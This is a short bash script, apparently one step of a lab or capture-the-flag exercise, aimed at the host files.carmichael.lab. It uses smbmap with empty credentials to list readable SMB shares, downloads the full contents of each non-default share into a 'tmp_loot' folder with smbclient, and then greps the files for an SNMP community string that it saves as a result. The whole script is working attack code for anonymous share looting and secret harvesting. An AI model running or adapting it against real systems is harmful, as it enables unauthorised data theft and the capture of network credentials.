#!/bin/bash
mkdir -p results tmp_loot
for share in $(smbmap -H files.carmichael.lab -u "" -p "" 2>/dev/null | tr -d '\r' |
               awk '$2 ~ /^READ/ && $1 != "public" && $1 !~ /^(IPC\$|ADMIN\$|C\$)$/ && $1 ~ /^[a-zA-Z0-9_-]+$/ {print $1}'); do
  mkdir -p tmp_loot/"$share"
  ( cd tmp_loot/"$share" && smbclient //files.carmichael.lab/"$share" -N \
      -c "recurse ON; prompt OFF; mget *" >/dev/null 2>&1 )
done
secret=$(grep -rhoE 'SNMP_COMMUNITY="[^"]+"' tmp_loot 2>/dev/null | head -n 1)
printf '%s\n' "$secret" | tee results/5-smb_share_loot.txt
